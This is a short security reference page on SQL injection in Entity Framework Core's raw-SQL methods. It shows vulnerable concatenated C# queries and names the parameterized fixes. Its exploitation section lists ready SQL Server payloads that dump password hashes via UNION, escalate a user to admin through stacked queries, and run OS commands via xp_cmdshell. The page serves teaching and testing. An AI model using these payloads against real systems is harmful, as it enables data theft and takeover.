---
title: "Entity Framework Core FromSqlRaw injection: concatenated raw SQL in EF Core"
description: FromSqlRaw, ExecuteSqlRaw, and SqlQueryRaw run attacker-controlled SQL when the query string is concatenated instead of parameterized, giving SQL injection in .NET apps.
keywords:
  - Entity Framework
  - EF Core
  - FromSqlRaw
  - ExecuteSqlRaw
  - .NET SQL injection
  - SQL injection
---

# Entity Framework Core FromSqlRaw injection

Entity Framework Core parameterizes LINQ queries, but its raw-SQL methods, `FromSqlRaw`, `ExecuteSqlRaw`, and `SqlQueryRaw`, execute whatever string they are given. When that string is built by concatenation or `string.Format`, user input lands directly in the SQL and the result is SQL injection, typically against SQL Server but also PostgreSQL/MySQL via their EF providers.

## Vulnerable patterns

```csharp
// name from the request, concatenated into raw SQL
var users = db.Users
    .FromSqlRaw("SELECT * FROM Users WHERE Name = '" + name + "'")
    .ToList();

db.Database.ExecuteSqlRaw("UPDATE Users SET Role='user' WHERE Id=" + id);
```

The `*Raw` suffix is the tell: these methods treat the string as-is. The parameterized forms (`FromSqlRaw("... = {0}", name)` with placeholders, or the interpolated `FromSql`/`FromSqlInterpolated` variants) send values as `DbParameter`s instead.

## Exploitation

For the single-quoted string context, standard breakout and union work. SQL Server is the common backend, so use its syntax:

```
' OR '1'='1
' UNION SELECT Id, Username, PasswordHash FROM Users --
'; EXEC xp_cmdshell 'whoami' --        (if xp_cmdshell is enabled and privileges allow)
```

For a numeric `Id` context:

```
1; UPDATE Users SET Role='admin' WHERE Id=1 --
0 UNION SELECT Id, Username, PasswordHash FROM Users
```

SQL Server's command separator `;` allows **stacked queries** over the same connection, so `UPDATE`/`INSERT`/`EXEC` after a `SELECT` are often viable, unlike many MySQL driver configurations. `FromSqlRaw` expects the projected columns to match the entity's mapped properties, so align a `UNION` select with the entity's column order (pad with `NULL`/`CAST`).

Error-based extraction via `CONVERT()`/`CAST()` type errors is reliable on SQL Server when exceptions surface to the response.

## References

- [EF Core docs: Raw SQL queries](https://learn.microsoft.com/en-us/ef/core/querying/sql-queries)
- [PayloadsAllTheThings: MSSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
